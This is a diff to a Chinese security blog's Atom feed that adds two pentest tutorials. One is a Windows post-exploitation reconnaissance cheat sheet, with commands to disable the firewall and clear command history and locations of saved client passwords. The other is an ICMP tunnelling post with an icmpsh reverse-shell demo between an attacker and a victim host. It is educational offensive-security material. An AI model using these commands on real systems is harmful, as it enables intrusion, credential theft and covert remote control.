@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://m0sway.github.io</id>
     <title>m0sway</title>
-    <updated>2020-07-31T08:59:48.345Z</updated>
+    <updated>2020-09-03T08:20:08.345Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://m0sway.github.io"/>
     <link rel="self" href="https://m0sway.github.io/atom.xml"/>
@@ -10,6 +10,399 @@
     <logo>https://m0sway.github.io/images/avatar.png</logo>
     <icon>https://m0sway.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, m0sway</rights>
+    <entry>
+        <title type="html"><![CDATA[Windows 系统信息收集]]></title>
+        <id>https://m0sway.github.io/post/windows-xi-tong-xin-xi-shou-ji/</id>
+        <link href="https://m0sway.github.io/post/windows-xi-tong-xin-xi-shou-ji/">
+        </link>
+        <updated>2020-09-03T07:43:54.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-本机信息">一、本机信息</h1>
+<h3 id="1-系统程序">1、系统程序</h3>
+<p>收集系统信息，包括操作系统版本，已安装补丁列表等。通常使用以下方法收集：</p>
+<pre><code>net config workstation/server                                 # 查询简易系统信息
+systeminfo                                                    # 查询全部内容
+wmic qfe get Caption,Description,HotFixID,InstalledOn         # 查询已安装的补丁列表
+</code></pre>
+<p>注：其中systeminfo命令查询内容最全，但如果系统更新的补丁较多，可能会导致反应反应时间过长；使用 webshell 执行此命令可能会因为超时导致无法正常回显，或回显内容长度过长，无法全部显示。</p>
+<h3 id="2-进程服务">2、进程服务</h3>
+<pre><code>tasklist /v                              # 查询正在运行的进程
+wmic product get name,version            # 查询所有安装过的软件及版本
+powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;
+# 使用 powershell 查询所有安装过的软件及版本，效果和 wmic 相同
+wmic service list brief                  # 查询当前机器的服务信息
+wmic startup get command,caption         # 查看启动项
+schtasks  /query  /fo  LIST /v           # 查看任务计划
+</code></pre>
+<p>windows 自带防火墙及特殊过滤规则等网络访问均可使用<code>netsh</code>及相关命令查看。</p>
+<pre><code>netsh firewall show config                      # 查看防火墙信息，但 firewall 命令已弃用，可使用 advfirewall 命令代替
+netsh advfirewall firewall show rule name=all   # 查看配置规则
+netsh advfirewall set allprofiles state off\on  # 关闭防火墙\开启防火墙
+netsh advfirewall export\import xx.pol          # 导出\导入配置文件
+netsh advfirewall firewall add rule name=”deny tcp 139″ dir=in protocol=tcp localport=139 action=block         # 新建规则阻止TCP协议139端口
+netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow              # 新建规则允许3389通过防火墙
+netsh advfirewall firewall delete rule name=Remote Desktop  # 删除名为Remote Desktop的规则
+netsh interface                                 # 连接安全规则配置，很少配置。
+</code></pre>
+<h3 id="3-用户信息">3、用户信息</h3>
+<pre><code>whoami                                   # 当前用户
+quser                                    # 查询登录用户，同 query user
+qwinsta                                  # 查询登录用户，同 query user
+query user                               # 查询登录用户
+query session                            # 查询会话
+query termserver                         # 查询远程桌面主机列表。
+net accounts                             # 查询域密码策略
+net user                                 # 查询本地用户列表
+net user &quot;$username&quot;                     # 查询指定用户
+net localgroup                           # 查询本地用户组列表
+net localgroup &quot;$groupname&quot;              # 查询指定用户组成员
+net group                                # 仅域控可执行，查询用户组列表
+net group &quot;$groupname&quot;                   # 仅域控可执行，查询用户组成员
+</code></pre>
+<p>注：quser、qwinsta和query命令只存在于允许安装 RDP 服务的主机上，官方描述其仅存在于 server 2012 及以上版本存在。其中query termserver命令存在问题，本地测试时与描述严重不符，无法列出信息。</p>
+<h3 id="4-操作记录">4、操作记录</h3>
+<p>cmd 和 powershell v3 以下的操作记录无法长时间保存，仅限当前窗口。</p>
+<pre><code>Get-History | Format-List -Property *         # 查询 powershell 当前窗口历史操作记录
+Clear-History                                 # 删除 powershell 当前窗口历史操作记录
+Clear-History -Id 3                           # 删除 powershell 当前窗口指定 ID 的历史操作记录
+doskey /h                                     # 查看 cmd 的历史操作记录
+doskey /reinstall                             # 删除 cmd 的历史操作记录
+</code></pre>
+<p>可以通过向进程发送键盘内容的方式将运行中的窗口历史操作记录导出。</p>
+<p>powershell v5 以上的操作历史记录会直接保存在指定文件中。直接查看即可。</p>
+<pre><code>可以通过向进程发送键盘内容的方式将运行中的窗口历史操作记录导出。
+
+powershell v5 以上的操作历史记录会直接保存在指定文件中。直接查看即可。
+</code></pre>
+<p>powershell v3、v4 版本需要安装<code>Get-PSReadlineOption</code>。<br>
+<code>msiexec /q /i PackageManagement_x64.msi</code></p>
+<h1 id="二-网络发现">二、网络发现</h1>
+<p>内网网络发现是一个很重要的信息收集内容，一般情况下是不建议使用扫描器扫描，尤其不建议使用 nmap，当然，如果是靶场，或是甲方授权就另当别论。</p>
+<h3 id="1-基本信息收集">1、基本信息收集</h3>
+<pre><code>
+ipconfig /all                     # 列出当前主机详细网络信息
+ipconfig  /displaydns             # 列出dns缓存信息
+route print                       # 查询路由表
+arp -a                            # 地址解析协议缓存表
+netstat -ano                      # 端口使用情况
+net share                         # 查看共享信息
+net view                          # 查看共享资源列表
+wmic share get name,path,status   # 查看共享信息
+# 查看 host 文件
+type  c:\Windows\system32\drivers\etc\hosts
+</code></pre>
+<p>使用 arp 命令收集最近建立过连接的 ip，但是此方法在某些时候无法收集到网段外的 ip 地址。</p>
+<h3 id="2-spn-信息收集">2、SPN 信息收集</h3>
+<p>SPN：服务主体名称。使用 Kerberos 须为服务器注册 SPN，因此可以在内网中扫描 SPN，快速寻找内网中注册的服务，SPN 扫描可以规避像端口扫描的不确定性探测动作。</p>
+<p>主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。</p>
+<p>利用 Windows 自带的 setspn 工具</p>
+<p>普通域用户权限执行即可</p>
+<pre><code>setspn -T domain.com -Q /
+</code></pre>
+<p>利用 GetUserSPNs.vbs</p>
+<p>使用 Rubeus 工具</p>
+<h3 id="3-协议探测">3、协议探测</h3>
+<h4 id="icmp-协议">icmp 协议</h4>
+<p>直接回显</p>
+<pre><code>for /l %i in (1,1,255) do @ ping 10.0.0.%i -w 1 -n 1|find /i &quot;ttl=&quot;
+</code></pre>
+<p>输出文件</p>
+<pre><code>@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i &gt;&gt; ip.txt) else (echo 192.168.0.%i &gt;&gt; ip.txt)
+</code></pre>
+<h4 id="netbios-协议">Netbios 协议</h4>
+<p>msf 扫描</p>
+<pre><code>msf &gt; use auxiliary/scanner/netbios/nbname
+</code></pre>
+<p>nbtscan 扫描，下载：</p>
+<pre><code>http://www.unixwiz.net/tools/nbtscan.html#download
+</code></pre>
+<p>参数：<code>-m 192.168.1.0/24</code></p>
+<h4 id="udp-协议">UDP 协议</h4>
+<p>msf</p>
+<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probemsf &gt; use auxiliary/scanner/discovery/udp_sweep
+</code></pre>
+<h4 id="smb-version">smb-version</h4>
+<p>python版：<code>https://github.com/amitn322/smb-version</code><br>
+c#版：<code>https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html</code></p>
+<h4 id="snmp-协议">SNMP 协议</h4>
+<p>msf</p>
+<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
+</code></pre>
+<h3 id="4-系统日志">4、系统日志</h3>
+<p>可以使用<code>wevtutil.exe psloglist.exe</code>或者 powershell 的<code>Get-WinEvent</code>模块进行日志导出，server 03 的域控可使用 eventquery.vbs 导出。</p>
+<p>wevtutil 不需要 UAC， 支持很多过滤语法，若有需要请查看官方说明。</p>
+<pre><code># 查询登录日志语法
+wevtutil qe security /f:text /q:*[System[(EventID=4624)]]
+# 查询所有登录、注销相关的日志语法
+wevtutil qe security /rd:true /f:text /q:&quot;*[system/eventid=4624 and 4623 and 4627]&quot;
+# 远程查询时在后面加入/r:computer /u:user /p:password 比如查询dc1上的登录注销日志
+wevtutil qe security /rd:true /f:text /q:&quot;*[system/eventid=4624 and 4623 and 4672]&quot; /r:dc1 /u:administrator /p:password
+</code></pre>
+<p>本地使用 LogParser 日志分析工具整理导出的日志，然后去除重复数据、无效数据（以 '$' 结束的用户名）</p>
+<pre><code>LogParser.exe -i:EVT -o txt &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,'|')) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,'|')) as SOURCE_IP FROM C:\ProgramData\log.evtx&quot; &gt; C:\ProgramData\log.txt
+</code></pre>
+<p>导出域控登录日志到域控上:</p>
+<pre><code>wevtutil epl Security C:\ProgramData\dc.evtx /q:&quot;*[EventData[Data[@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 2592000000]]]&quot; /r:域控IP /u:域管 /p:域管密码
+</code></pre>
+<h3 id="5-浏览器日志">5、浏览器日志</h3>
+<p>收集浏览器访问记录。</p>
+<p>chrome</p>
+<pre><code>C:\Users$username\AppData\Local\Google\Chrome\User Data\Default\History
+</code></pre>
+<p>firefox</p>
+<pre><code>C:\Users$username\AppData\Roaming\Mozilla\Firefox\Profiles$name.default\places.sqlite
+</code></pre>
+<p>IE</p>
+<pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs&quot; 或C:\Users$user\AppData\Local\Microsoft\Windows\History
+</code></pre>
+<p>edge, v79+:</p>
+<pre><code>C:\Users$user\AppData\Local\Microsoft\Edge\User Data\Default\History
+</code></pre>
+<p>v44+</p>
+<pre><code>C:\Users$user\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat
+</code></pre>
+<h3 id="6-dns-服务器记录">6、DNS 服务器记录</h3>
+<p>如果目标机器在域内，只需要按部就班收集域信息，准备域横向渗透即可。</p>
+<p>但其中有一点单独提一下，一般在域环境中都会有一台 DNS 服务器，小企业或内网环境较小的可能会和域控为同一台，大一些的企业，多为独立的 DNS 服务器。</p>
+<p>由于 DNS 服务器的特性，因此，在 DNS 服务器上会存在大量内网地址解析记录，如果可以获取，会极大的方便内网拓扑展开，同时很多其他主机无法到达的地址，DNS 服务器是可以到达的。</p>
+<p>列出 DNS 区域中当前节点的资源记录</p>
+<p><code>dnscmd . /EnumZones</code></p>
+<p>列出 test.com 的信息</p>
+<p><code>dnscmd . /ZoneInfo test.com</code></p>
+<p>列出 test.com 中的详细记录</p>
+<p><code>dnscmd . /ZonePrint test.com</code></p>
+<p>列出 test.com 中的记录</p>
+<p><code>dnscmd . /EnumRecords test.com</code></p>
+<p>DNS 记录有正向解析和反向解析两种。</p>
+<p>正向解析是从域名到IP，反向解析则是从 IP 到域名。</p>
+<p>反向隔离和正向隔离相同，都会有一个对应的区域，因此，查询方式与正向记录相同。</p>
+<p>DNS 服务器还存在域传送漏洞。可以直接获得 DNS 记录。</p>
+<pre><code>nslookup -type=all_ldap._tcp.dc.greyfinger.com
+
+nslookup -type=ns domain.com
+
+cmd&gt; nslookup server dns.domain.com ls domain.com
+</code></pre>
+<h1 id="三-域信息查询">三、域信息查询</h1>
+<h3 id="1-基本信息收集-2">1、基本信息收集</h3>
+<p>域信息收集，需要当前用户为域用户。本地用户无法执行域命令查询域内容。</p>
+<pre><code>
+net config workstation                    # 查询当前登录域
+net time                                  # 同步时间，通常为域控服务器
+net accounts /domain                      # 查询域密码策略
+net user /domain                          # 列出当前域成员列表
+net user username /domain                 # 列出域成员详细信息
+net group /domain                         # 列出域内组列表
+net group groupname /domain               # 列出域内组成员列表
+net view                                  # 查询同一域内机器列表
+net view /domain                          # 查询域列表
+net view /domain:test                     # 查询 test 域中计算机列表
+nltest /dclist:domain                     # 查询域内的所有DC
+nltest /dsgetdc:domain                    # 拿到DC当前的认证信息
+nltest /domain_trusts                     # 查询域信任信息
+nltest /user:&quot;username&quot;                   # 得到用户信息
+</code></pre>
+<p>想要定位域管和域控机器，可以查询<code>domain admin</code>和<code>domain controllers</code>组，需要注意的是，组名会随系统语言变化而变化，如<code>domain controllers</code>会变化成<code>domaine contrôleurs</code>。</p>
+<p>在域内其他机器上，查询组是<code>net group /domain</code>，而在域控上则是<code>net group</code>。</p>
+<h3 id="2-dsquery">2、dsquery</h3>
+<p>dsquery 命令很少使用，而且限制较大仅能在域控上执行，所以相对而言较为鸡肋，但是在一定条件下还是具有一定的使用价值。</p>
+<pre><code>dsquery computer                          # 查询目录中的计算机
+dsquery contact                           # 查询目录中的联系人
+dsquery subnet                            # 查询目录中的子网
+dsquery group                             # 查询目录中的组
+dsquery site                              # 查询目录中的站点
+dsquery user                              # 查询目录中的用户
+</code></pre>
+<h3 id="3-powershell">3、powershell</h3>
+<pre><code># 查询当前Domain信息
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+# 查询域信任关系
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+# 查询当前林信息
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+# 查询林信任信息
+([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
+</code></pre>
+<h1 id="四-配置文件收集">四、配置文件收集</h1>
+<h3 id="配置文件">配置文件</h3>
+<p>IIS 配置文件路径为：</p>
+<pre><code>%windir%\system32\inetsrv\config\applicationHost.config
+</code></pre>
+<p>使用 appcmd 的方式可以快速导出所需内容：</p>
+<pre><code>%windir%\system32\inetsrv\appcmd list site /config %windir%\system32\inetsrv\appcmd list site /config /xml &gt; c:\sites.xml
+</code></pre>
+<h3 id="密码保存">密码保存</h3>
+<h4 id="navicat">navicat</h4>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th style="text-align:left">路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\Navicat\Servers\</td>
+</tr>
+<tr>
+<td>MariaDB</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMARIADB\Servers\</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMONGODB\Servers\</td>
+</tr>
+<tr>
+<td>Microsoft SQL</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMSSQL\Servers\</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatOra\Servers\</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatPG\Servers\</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatSQLite\Servers\</td>
+</tr>
+</tbody>
+</table>
+<h4 id="navicat-2">navicat</h4>
+<table>
+<thead>
+<tr>
+<th>系统版本</th>
+<th style="text-align:left">路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>xp/win2003</td>
+<td style="text-align:left">C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td>
+</tr>
+<tr>
+<td>win7/win2008以上</td>
+<td style="text-align:left">C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
+</tr>
+</tbody>
+</table>
+<h4 id="xshell">Xshell</h4>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th style="text-align:left">路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Xshell 5</td>
+<td style="text-align:left">%userprofile%\Documents\NetSarang\Xshell\Sessions</td>
+</tr>
+<tr>
+<td>Xshell 6</td>
+<td style="text-align:left">%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td>
+</tr>
+</tbody>
+</table>
+<h4 id="winscp">WinSCP</h4>
+<pre><code>HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
+</code></pre>
+<h4 id="vnc">VNC:</h4>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th style="text-align:left">路径</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RealVNC</td>
+<td style="text-align:left">HKEYLOCALMACHINE\SOFTWARE\RealVNC\vncserver</td>
+<td>Password</td>
+</tr>
+<tr>
+<td>TightVNC</td>
+<td style="text-align:left">HKEYCURRENTUSER\Software\TightVNC\Server Value</td>
+<td>Password or PasswordViewOnly</td>
+</tr>
+<tr>
+<td>TigerVNC</td>
+<td style="text-align:left">HKEYLOCALUSER\Software\TigerVNC\WinVNC4</td>
+<td>Password</td>
+</tr>
+<tr>
+<td>UltraVNC</td>
+<td style="text-align:left">C:\Program Files\UltraVNC\ultravnc.ini</td>
+<td>passwd or passwd2</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网渗透:隐藏通讯隧道技术]]></title>
+        <id>https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/</id>
+        <link href="https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/">
+        </link>
+        <updated>2020-08-03T06:18:54.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="隧道">隧道？</h2>
+<p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
+<p>常用的隧道技术有以下三种：</p>
+<ul>
+<li>网络层：IPv6 隧道、ICMP 隧道</li>
+<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
+<li>应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道</li>
+</ul>
+<h2 id="icmp-隧道">ICMP 隧道</h2>
+<p>ICMP（Internet ControlMessages Protocol，网间控制报文协议）是TCP/IP协议族的子协议，是一种面向无连接的协议。</p>
+<p>在 ICMP 通信协议中，通信双方的两台设备不需要开放端口即可进行，而在一般的通信协议中，是必须要开放端口的。最常见的 ICMP 协议的消息为 ping 命令的回复，攻击者可以利用命令行得到比回复更多的 ICMP 请求。</p>
+<p>在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道、DNS隧道、常规端口转发等）进行的操作都失败了，由于防火墙不会屏蔽ping数据包，所以常常会通过ping命令访问远程主机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问。</p>
+<p>经常使用的ping命令就是基于ICMP协议，windows系统下ping默认传输的是： abcdefghijklmnopqrstuvwabcdefghi，共32bytes，如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1596435955491.jpg" alt="" loading="lazy"></p>
+<p>linux系统下，ping默认传输的是48bytes，前8bytes随时间变化，后面的固定不变，内容为!”#$%&amp;’()+,-./01234567，如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1596435987171.jpg" alt="" loading="lazy"></p>
+<p>此外，ping的包大小，也就是data大小是可以修改的，从包体内容来看，规律还是一样，就是重复罢了，如下图所示：分别是win和linux<br>
+<img src="https://m0sway.github.io/post-images/1596436036345.jpg" alt="" loading="lazy"><br>
+<img src="https://m0sway.github.io/post-images/1596436043909.jpg" alt="" loading="lazy"></p>
+<p>那么问题来了：是否可以改变这些data填充我们自己的数据呢？<br>
+答案是可以的，这就是ICMP隐蔽隧道的原理，改变操作系统默认填充的Data，替换成我们自己的数据。</p>
+<p>icmpsh<br>
+icmpsh 工具是一个简单的ICMP反弹shell工具。可以跨平台，且运行时无需管理员权限。</p>
+<p>下载地址：https://github.com/inquisb/icmpsh</p>
+<p>运行需要安装Python的impacket类库，以便对tcp、udp、icmp、igmp、arp、ipv4、ipv6、smb、等进行访问。</p>
+<p>icmpsh 运行时因为要代替系统本身的ping命令的应答程序，所以需要先执行以下命令关闭本地系统的ICMP应答，否则获得的shell不稳定：<br>
+<code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1 // 恢复设为0</code><br>
+<img src="https://m0sway.github.io/post-images/1596436339770.jpg" alt="" loading="lazy"></p>
+<h3 id="演示">演示</h3>
+<p>攻击者IP：192.168.200.103<br>
+受害者IP：192.168.200.110</p>
+<p>攻击者server端在项目目录下输入：</p>
+<pre><code>    python icmpsh_m.py 192.168.200.103 192.168.200.110
+    python icmpsh_m.py 攻击者ip 受害者ip
+</code></pre>
+<p>或输入./run.sh运行程序，之后提醒你输入受害者公网ip，会给出你在受害者主机上执行的命令。</p>
+<p>给受害者主机上传icmpsh.exe并执行命令：</p>
+<pre><code>    icmpsh.exe -t 192.168.200.103 -d 500 -b 30 -s 128
+</code></pre>
+<p>即可在攻击机上看到受害者的shell：</p>
+<pre><code>imcpsh.exe参数：
+    -t  host主机ip地址，用于向其发送ping请求。 此选项是强制性的！
+    -r  发送包含字符串的单个测试icmp请求，然后退出。这是用于测试连接的。
+    -d  毫秒请求之间的延迟（以毫秒为单位）
+    -o  毫秒响应超时（以毫秒为单位）。 如果未及时收到回复，
+                        从站将增加一个空白计数器。 如果该计数器达到极限，则从站将退出。
+                        如果收到响应，则计数器设置回0。
+    -b  空格数限制（退出前未答复的icmp请求
+    -s  字节最大数据缓冲区大小（以字节为单位）
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[反弹shell总结]]></title>
         <id>https://m0sway.github.io/post/fan-dan-shell-zong-jie/</id>
